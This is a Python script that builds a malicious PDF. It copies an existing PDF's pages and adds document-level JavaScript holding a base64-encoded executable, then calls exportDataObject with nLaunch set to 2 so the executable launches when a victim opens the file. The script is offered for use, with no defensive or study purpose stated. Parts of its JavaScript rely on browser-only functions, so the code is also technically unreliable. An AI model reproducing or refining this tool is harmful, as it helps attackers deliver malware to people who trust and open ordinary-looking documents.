import argparse
import os
import shutil
import base64
from PyPDF2 import PdfReader, PdfWriter
from PIL import Image
from io import BytesIO

def embed_file_into_pdf(exe_path, pdf_path, output_path):
    # Read the existing PDF file
    with open(pdf_path, 'rb') as pdf_file:
        pdf_reader = PdfReader(pdf_file)
        num_pages = len(pdf_reader.pages)

        # Create a new PDF writer
        pdf_writer = PdfWriter()

        # Add each page from the existing PDF to the new PDF
        for page_num in range(num_pages):
            page = pdf_reader.pages[page_num]
            pdf_writer.add_page(page)

        # Add JavaScript to execute the embedded executable for the entire PDF
        js_code = f'''
        var exe_path = "{exe_path.encode('unicode_escape').decode()}";
        var exe_data = "{base64.b64encode(open(exe_path, 'rb').read()).decode()}";
        var exe_bytes = atob(exe_data);
        var arr = [];
        for (var i = 0; i < exe_bytes.length; i++) {{
            arr.push(exe_bytes.charCodeAt(i));
        }}
        var exe_blob = new Blob([new Uint8Array(arr)], {{type: 'application/octet-stream'}});
        var exe_url = URL.createObjectURL(exe_blob);
        this.exportDataObject({{ cName: exe_path, nLaunch: 2, cFile: exe_url }});
        '''

        pdf_writer.add_js(js_code.replace('\n', ' '))

        # Save the new PDF
        with open(output_path, 'wb') as output_pdf:
            pdf_writer.write(output_pdf)

def main():
    parser = argparse.ArgumentParser(description='Embed an executable file into a PDF with JavaScript.')
    parser.add_argument('exe_path', type=str, help='Path to the executable file.')
    parser.add_argument('input_path', type=str, help='Path to the input PDF file.')
    parser.add_argument('-o', '--output', type=str, help='Output path for the new PDF.', default='output.pdf')
    args = parser.parse_args()

    # Check if the executable file exists
    if not os.path.exists(args.exe_path):
        print(f"Executable file '{args.exe_path}' not found.")
        return

    # Check if the input PDF file exists
    if not os.path.exists(args.input_path):
        print(f"Input PDF file '{args.input_path}' not found.")
        return

    # Embed the executable file into the PDF
    embed_file_into_pdf(args.exe_path, args.input_path, args.output)
    print(f"Executable '{args.exe_path}' embedded into '{args.input_path}'. New PDF saved as '{args.output}'.")

if __name__ == "__main__":
    main()
